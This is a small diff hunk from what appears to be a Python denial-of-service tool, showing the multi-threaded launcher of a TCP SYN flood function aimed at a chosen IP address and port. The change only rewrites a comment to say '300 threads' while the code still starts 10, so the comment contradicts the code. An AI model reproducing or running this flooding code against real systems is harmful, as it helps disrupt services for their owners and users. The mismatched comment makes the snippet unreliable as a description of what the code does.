@@ -107,7 +107,7 @@ def tcp_syn_flood_multi(ip, port, duration):
         sock.close()
 
     print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP SYN flood (Multi-threaded) on {ip}:{port} for {duration} seconds...")
-    threads = [threading.Thread(target=syn_worker) for _ in range(10)]  # 10 threads
+    threads = [threading.Thread(target=syn_worker) for _ in range(10)]  # 300 threads
     for t in threads:
         t.start()
     for t in threads:
